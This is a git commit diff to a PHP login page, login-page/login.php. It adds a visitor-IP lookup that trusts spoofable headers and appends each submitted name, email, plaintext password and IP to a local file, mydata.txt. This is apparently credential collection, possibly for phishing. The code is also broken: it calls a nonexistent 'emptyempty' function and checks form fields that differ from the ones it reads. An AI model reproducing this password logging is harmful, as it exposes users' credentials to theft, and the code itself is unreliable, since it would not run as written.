cb1487996f8175684a99ce3f4b3b2f2975f5b353
Kevin Guo <kev.guo123@gmail.com>
2021-04-27 15:22:48 -0500

    change delimiter to whitespace and try grabbing ip of visitor

--- login-page/login.php
+++ login-page/login.php
@@ -1,6 +1,23 @@
 <?php
+function getIPAddress() {  
+    //whether ip is from the share internet  
+    if(!emptyempty($_SERVER['HTTP_CLIENT_IP'])) {  
+                $ip = $_SERVER['HTTP_CLIENT_IP'];  
+    }  
+    //whether ip is from the proxy  
+    elseif (!emptyempty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
+                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
+    }  
+    //whether ip is from the remote address  
+    else{  
+             $ip = $_SERVER['REMOTE_ADDR'];  
+    }  
+    return $ip;  
+}
+
 if(isset($_POST['name-9ee8']) && isset($_POST['email-9ee8']) && isset($_POST['message-9ee8'])) {
-    $data = $_POST['name'] . '-' . $_POST['email'] . '-' . $_POST['password'] . "\r\n";
+    $ip = getIPAddress();  
+    $data = $_POST['name'] . ' ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $ip . "\r\n";
     $ret = file_put_contents('mydata.txt', $data, FILE_APPEND | LOCK_EX);
     if($ret === false) {
         die('There was an error writing this file');
